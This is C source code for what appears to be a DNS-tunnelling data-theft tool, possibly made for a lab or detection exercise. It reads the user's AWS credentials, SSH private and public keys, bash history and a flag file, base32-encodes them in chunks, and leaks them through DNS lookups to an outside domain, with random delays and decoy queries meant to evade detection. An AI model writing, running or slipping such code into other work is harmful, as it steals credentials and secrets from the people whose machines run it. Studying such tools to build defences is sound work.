#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <stdbool.h>
#include <assert.h>
#include <limits.h>
#include <stddef.h>
#include <time.h>
#include <unistd.h>

#define BASE32_LEN(len)  (((len)/5)*8 + ((len) % 5 ? 8 : 0))
#define UNBASE32_LEN(len)  (((len)/8)*5)
#define TOTAL_FILES 5
#define CHUNK_SIZE 25

const char SUFFIX[] = "mbI.is";
const char FILES[][20] = {"/.aws/credentials", "/.secrets/flag", "/.ssh/id_rsa", "/.ssh/id_rsa.pub", "/.bash_history"};

bool file_exists(const char* filename) {
  FILE* file = fopen(filename, "r");
  if (file != NULL) {
      fclose(file);
      return true;
  }
  return false;
}

void read_file(const char* filename) {
  return;
}

static size_t min(size_t x, size_t y) {
	return x < y ? x : y;
}

static const unsigned char PADDING_CHAR = '=';

static void pad(unsigned char *buf, int len) {
	for (int i = 0; i < len; i++)
		buf[i] = PADDING_CHAR;
}

static unsigned char encode_char(unsigned char c) {
	static unsigned char base32[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567";
	return base32[c & 0x1F];
}

static int get_octet(int block) {
	assert(block >= 0 && block < 8);
	return (block*5) / 8;
}

static int get_offset(int block) {
	assert(block >= 0 && block < 8);
	return (8 - 5 - (5*block) % 8);
}

static unsigned char shift_right(unsigned char byte, char offset) {
	if (offset > 0)
		return byte >>  offset;
	else
		return byte << -offset;
}

static void encode_sequence(const unsigned char *plain, int len, unsigned char *coded) {
	assert(CHAR_BIT == 8);
	assert(len >= 0 && len <= 5);

	for (int block = 0; block < 8; block++) {
		int octet = get_octet(block);
		int junk = get_offset(block);

		if (octet >= len) {
			pad(&coded[block], 8 - block);
			return;
		}

		unsigned char c = shift_right(plain[octet], junk);

		if (junk < 0 &&  octet < len - 1) {
			c |= shift_right(plain[octet+1], 8 + junk);
		}
		coded[block] = encode_char(c);
	}
}

void base32_encode(const unsigned char *plain, size_t len, unsigned char *coded) {
	for (size_t i = 0, j = 0; i < len; i += 5, j += 8) {
		encode_sequence(&plain[i], min(len - i, 5), &coded[j]);
	}
}

unsigned char* build(unsigned char* data, int data_length, int is_legitimate, int store_response) {
  srand(time(NULL));
  unsigned char checksum = 0;

  for (int i = 0; i < data_length; i++) {
    checksum ^= data[i];
  }

  int flags = (data_length & 0x1F) | (is_legitimate ? 0x20 : 0) | (store_response ? 0x40 : 0);

  // Create subdomain
  char* subdomain = (char*)malloc(data_length +  1);
  sprintf(subdomain, "%c-%c-%c-%c-%c-%s", rand() % 256, rand() % 256, checksum, rand() % 256, flags, data);
  int subdomain_len = strlen(subdomain);

  // Base32 encode subdomain and return
  unsigned char* encoded_chunk = (unsigned char*)malloc(BASE32_LEN(subdomain_len) + 1);
  base32_encode((const uint8_t *)subdomain, subdomain_len, encoded_chunk);
  encoded_chunk[BASE32_LEN(subdomain_len)] = '\0';

  free(subdomain);
  return encoded_chunk;
}

void exfil(unsigned const char* subdomain, const char* suffix) {
  char* domain = (char*)malloc(strlen((const char*)subdomain) + strlen(suffix) + 1);
  sprintf(domain, "%s.%s", subdomain, suffix);
  struct hostent* host = gethostbyname(domain);
}

void mock_exfil(unsigned const char* subdomain, const char* suffix) {
  sleep(1);
  char* domain = (char*)malloc(strlen((const char*)subdomain) + strlen(suffix) + 1);
  sprintf(domain, "%s.%s", subdomain, suffix);
  printf("Exfiltrating: %s...\n", domain);
}

char* legit_string() {
    char* random_string = (char*)malloc((CHUNK_SIZE + 1) * sizeof(char));
    
    if (random_string == NULL) {
        return NULL;
    }
    
    srand(time(NULL));
    
    for (int i = 0; i < CHUNK_SIZE; ++i) {
        random_string[i] = 'A' + (rand() % 58);
    }
    random_string[CHUNK_SIZE] = '\0';

    return random_string;
}

int main() {
  printf("Starting program after 10s, get ready\n");
  sleep(3);

  for (int f = 0; f < TOTAL_FILES; f++) {
    char *filename = malloc(strlen(getenv("HOME")) + strlen(FILES[f]) + 1);
    strcpy(filename, getenv("HOME"));
    strcat(filename, FILES[f]);
    FILE* file = fopen(filename, "r");
    printf("Now reading: %s\n", filename);
    
    // File doesn't exist or we can't read it so we don't care
    if (file == NULL) {
      printf("Failed to read %s\n", FILES[f]);
      continue;
    }
    srand(time(NULL));
    sleep(rand() % (20 + 1 - 5) + 5);
    
    char chunk[26];
    size_t bytes_read;
    
    while ((bytes_read = fread(chunk, sizeof(char), CHUNK_SIZE, file)) > 0) {
      srand(time(NULL));
      chunk[bytes_read] = '\0';
      size_t chunk_size = strlen(chunk);
      printf("Reading %s\n", chunk);
      unsigned char *subdomain = build((unsigned char*)chunk, chunk_size, true, false);

      if ((rand() % 2) == 1) {
        char* rand_val = legit_string();
        unsigned char *dummydomain = build((unsigned char*)rand_val, strlen((char*)rand_val), false, false);
        free(rand_val);
        exfil(dummydomain, SUFFIX);
        free(dummydomain);
      }

      srand(time(NULL));
      exfil(subdomain, SUFFIX);

      srand(time(NULL));
      if ((rand() % 4) == 3) {
        char* rand_val = legit_string();
        unsigned char *dummydomain = build((unsigned char*)rand_val, strlen((char*)rand_val), false, false);
        free(rand_val);
        exfil(dummydomain, SUFFIX);
        free(dummydomain);
      }

      srand(time(NULL));
      sleep(rand() % (2 + 1 - 1) + 1);
      free(subdomain);
    }
    free(filename);
    fclose(file);
  }
  return 0;
}
